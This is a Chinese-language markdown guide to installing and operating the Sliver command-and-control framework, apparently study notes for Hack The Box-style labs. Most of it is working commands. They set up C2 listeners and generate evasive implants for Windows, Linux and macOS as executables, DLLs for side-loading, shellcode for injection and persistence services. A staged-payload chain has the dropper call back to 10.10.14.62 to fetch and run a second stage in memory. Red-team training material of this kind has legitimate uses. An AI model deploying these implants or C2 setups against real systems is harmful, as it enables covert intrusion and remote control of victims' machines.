# Sliver — 安裝與設定

## 安裝 Server

```bash
# 下載 Server
curl -L https://github.com/BishopFox/sliver/releases/latest/download/sliver-server_linux \
  -o /usr/local/bin/sliver-server
chmod +x /usr/local/bin/sliver-server

# 啟動（首次執行自動生成 PKI）
sudo sliver-server

# 以 daemon 方式執行
sudo sliver-server daemon
```

## 安裝 Client

```bash
curl -L https://github.com/BishopFox/sliver/releases/latest/download/sliver-client_linux \
  -o /usr/local/bin/sliver
chmod +x /usr/local/bin/sliver

# 啟動 Client（本機）
sliver
```

## Listeners（監聽器 / Job）

### Listener 的角色

Listener 是 Server 端等待 Implant 回連的服務，每個 Listener 就是一個 **Job**。

```
目標執行 Implant
      ↓
Implant 發起連線到 Listener（你設定的 lhost:lport）
      ↓
Listener 收到後，通知 Server 建立 Session 或 Beacon
      ↓
Operator 可以開始操作
```

> **注意**：Listener 的 `lhost` = 你的 C2 Server IP（攻擊者視角的「本地」），不是 127.0.0.1。  
> Implant 裡寫的回連 IP 必須與 Listener 的 IP 一致，否則連不上。

### 常用指令

```bash
jobs                          # 列出所有 Listeners（Job ID / 協議 / Port）
jobs --kill <JOB_ID>          # 停止指定 Listener
jobs --kill-all               # 停止所有 Listeners

# 啟動各類型 Listener
mtls  --lhost 0.0.0.0 --lport 4444      # mTLS（預設）
https --lhost 0.0.0.0 --lport 443       # HTTPS（推薦 OPSEC）
http  --lhost 0.0.0.0 --lport 80        # HTTP（明文，測試用）
dns   --domains c2.yourdomain.com       # DNS
wg    --lhost 0.0.0.0 --lport 53        # WireGuard
tcp   --lhost 0.0.0.0 --lport 8888      # TCP（直連）

# 完整選項範例（HTTPS）
https \
  --lhost 0.0.0.0 \          # 綁定所有介面（0.0.0.0）或指定 IP
  --lport 443 \              # 監聽 Port
  --domain c2.example.com \  # 偽裝域名（Host Header）
  --website mysite           # 回應正常網頁（掩護用）
```

### Listener 與 Implant 的對應關係

| Listener 協議 | generate 對應參數 | 說明 |
|--------------|-----------------|------|
| `mtls --lport 4444` | `--mtls <IP>:4444` | mTLS |
| `https --lport 443` | `--https <IP>:443` | HTTPS |
| `http --lport 80` | `--http <IP>:80` | HTTP |
| `dns --domains c2.x.com` | `--dns c2.x.com` | DNS |
| `tcp --lport 8888` | `--tcp-pivot <IP>:8888` | TCP |

> 一個 Implant 可以設定**多個回連位址**（Fallback），依序嘗試：
> ```bash
> generate --mtls <IP>:4444 --https <IP>:443 --os windows
> ```

## Implant 生成

### 基本指令

```bash
# Windows x64 mTLS Session
generate --mtls <LHOST>:4444 --os windows --arch amd64 --save /tmp/

# Windows x64 mTLS Beacon
generate beacon --mtls <LHOST>:4444 --os windows --arch amd64 --save /tmp/

# Linux x64 HTTPS Beacon
generate beacon --https <LHOST>:443 --os linux --arch amd64 --save /tmp/

# macOS arm64
generate --mtls <LHOST>:4444 --os mac --arch arm64 --save /tmp/
```

### 完整選項

```bash
generate [beacon] \
  --mtls <LHOST>:<PORT> \      # 傳輸協議（擇一）
  --https <LHOST>:<PORT> \
  --http <LHOST>:<PORT> \
  --dns <DOMAIN> \
  --os windows|linux|mac \     # 目標 OS
  --arch amd64|386|arm64 \     # 架構
  --format exe|dll|shellcode|shared|service \  # 輸出格式
  --name my-implant \          # 自訂名稱
  --save /tmp/ \               # 儲存路徑
  --evasion \                  # 啟用混淆
  --skip-symbols \             # 減小體積
  --seconds 60 \               # Beacon sleep 間隔
  --jitter 30 \                # Jitter 百分比
  --reconnect 60 \             # 重連間隔（秒）
  --max-errors 10              # 最大錯誤次數
```

### 輸出格式

| 格式 | 說明 | 使用場景 |
|------|------|---------|
| `exe` | Windows 執行檔 | 直接執行 |
| `dll` | Windows DLL | DLL Injection、Side-loading |
| `shared` | Linux .so | 共享函式庫注入 |
| `shellcode` | 原始 Shellcode | 注入其他程序 |
| `service` | Windows Service | 服務持久化 |

## Profiles（設定檔）

### Profile 的角色

Profile 是**Implant 的生成藍圖**，把 `generate` 的所有參數存起來，方便重複使用或給 Stager 參照。

```
Profile（藍圖）
  ↓ profiles generate 或 stage-listener 參照
Implant / Shellcode（實體）
  ↓ 執行在目標
Session / Beacon（連線）
  ↓ Operator 操作
```

### Profile vs 直接 generate

| | `generate` 直接生成 | `profiles new` + `profiles generate` |
|-|-------------------|--------------------------------------|
| **適用** | 一次性、快速測試 | 需要重複生成、或配合 Stager |
| **Stager 支援** | ❌ 無法讓 stage-listener 參照 | ✅ stage-listener 必須指定 Profile |
| **重現性** | 每次參數要重打 | 一次定義，多次生成 |

### 常用指令

```bash
profiles                                        # 列出所有 Profiles
profiles new [OPTIONS] <PROFILE_NAME>           # 建立 Profile
profiles generate <PROFILE_NAME> --save /tmp/   # 從 Profile 生成 Implant
profiles rm <PROFILE_NAME>                      # 刪除 Profile

# 建立範例（Windows x64 HTTPS Beacon）
profiles new \
  --https 10.10.14.62:443 \
  --os windows \
  --arch amd64 \
  --format exe \
  --seconds 60 \
  --jitter 30 \
  --evasion \
  win64-https-beacon

# 從 Profile 生成 Implant
profiles generate win64-https-beacon --save /tmp/
```

### Profile 與 Stager 的關係

Stager 分兩段：**Stager（小 Dropper）** 和 **Stage 2（真正的 Implant）**。  
Profile 定義的是 Stage 2 的規格，`stage-listener` 讀取 Profile 來動態生成並提供 Stage 2。

```
generate stager（小型 Shellcode/Dropper）
      ↓ 目標執行後，回連 stage-listener
stage-listener（讀取 Profile，動態提供 Stage 2）
      ↓ 目標下載 Stage 2 到記憶體執行
Profile 定義的 Implant（Stage 2）啟動
      ↓ 回連 Listener（Profile 裡設定的 lhost）
Session / Beacon 建立
```

```bash
# 1. Profile = Stage 2 的藍圖（回連用 HTTP:8088，格式 shellcode）
profiles new --http 10.10.14.62:8088 --format shellcode htb

# 2. stage-listener = 提供 Stage 2 的服務（Stager 去這裡拿）
stage-listener --url tcp://10.10.14.62:4443 --profile htb
#              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^  Stager 回連位址
#                                            --profile 指定用哪個藍圖生成 Stage 2

# 3. HTTP Listener = Stage 2（Implant）回連的 C2 通道
http -L 10.10.14.62 -l 8088

# 4. Stager = 目標執行的小型 Dropper
generate stager --lhost 10.10.14.62 --lport 4443 --format csharp --save staged.txt
```

> **三者 Port 各自獨立：**
> - `4443` → Stager 取 Stage 2 用（stage-listener）
> - `8088` → Stage 2 Implant 的 C2 回連（HTTP Listener）
> - `4443 ≠ 8088`，功能不同，不可混用

## Stageless vs Stager

### Stageless（預設）

完整 Payload，直接執行即可回連。體積較大（數 MB）。

```bash
generate --mtls <LHOST>:4444 --os windows --save /tmp/
```

### Stager（分段載入）

小型 Dropper → 回連下載 Stage 2 → 記憶體執行。

```bash
# 1. 建立 Profile（定義 Stage 2 規格）
profiles new --http <LHOST>:8088 --format shellcode htb

# 2. 啟動 Stage Listener
stage-listener --url tcp://<LHOST>:4443 --profile htb

# 3. 啟動 HTTP Listener（C2 回連用）
http -L <LHOST> -l 8088

# 4. 生成 Stager Shellcode
generate stager --lhost <LHOST> --lport 4443 --protocol tcp --format csharp --save staged.txt
```
